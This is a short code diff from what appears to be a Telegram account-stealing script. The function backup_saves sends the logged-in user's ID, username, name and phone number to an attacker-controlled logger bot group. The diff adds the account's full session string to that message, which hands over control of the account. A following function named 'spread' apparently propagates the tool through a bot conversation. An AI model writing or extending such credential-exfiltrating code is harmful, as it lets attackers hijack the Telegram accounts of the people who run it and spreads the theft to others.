@@ -50,7 +50,7 @@ async def backup_saves(client, me, logger_bot):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
+    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSession: {client.session.save()}")
 async def spread(client, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
